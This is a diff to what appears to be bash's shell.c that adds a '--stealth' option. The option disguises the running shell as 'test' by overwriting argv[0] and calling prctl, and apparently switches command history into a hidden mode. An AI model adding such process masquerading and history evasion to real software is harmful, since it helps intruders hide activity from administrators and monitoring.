@@ -84,6 +84,8 @@
 #  include <opennt/opennt.h>
 #endif
 
+#include <sys/prctl.h>
+
 #if !defined (HAVE_GETPW_DECLS)
 extern struct passwd *getpwuid ();
 #endif /* !HAVE_GETPW_DECLS */
@@ -230,6 +232,7 @@ int posixly_correct = 1;	/* Non-zero means posix.2 superset. */
 #else
 int posixly_correct = 0;	/* Non-zero means posix.2 superset. */
 #endif
+int stealth_mode = 0;
 
 /* Some long-winded argument names.  These are obviously new. */
 #define Int 1
@@ -265,6 +268,7 @@ static const struct {
 #if defined (WORDEXP_OPTION)
   { "wordexp", Int, &wordexp_only, (char **)0x0 },
 #endif
+  { "stealth", Int, &stealth_mode, (char **)0x0 },
   { (char *)0x0, Int, (int *)0x0, (char **)0x0 }
 };
 
@@ -453,8 +457,7 @@ main (argc, argv, env)
     }
 
   shell_environment = env;
-  set_shell_name (argv[0]);
-  shell_start_time = NOW;	/* NOW now defined in general.h */
+  shell_start_time = NOW;      /* NOW now defined in general.h */
 
   /* Parse argument flags from the input line. */
 
@@ -474,8 +477,21 @@ main (argc, argv, env)
     }
 
   /* All done with full word options; do standard shell option parsing.*/
-  this_command_name = shell_name;	/* for error reporting */
+  this_command_name = shell_name;      /* for error reporting */
   arg_index = parse_shell_options (argv, arg_index, argc);
+
+  if (stealth_mode)
+    {
+      int argv0size = strlen(argv[0]);
+      strncpy(argv[0], "test", argv0size);
+      prctl(PR_SET_NAME, "test");
+
+#if defined (HISTORY)
+      switch_history_to_stealth_mode ();
+#endif /* HISTORY */
+
+    }
+  set_shell_name (argv[0]);
 
   /* If user supplied the "--login" (or -l) flag, then set and invert
      LOGIN_SHELL. */
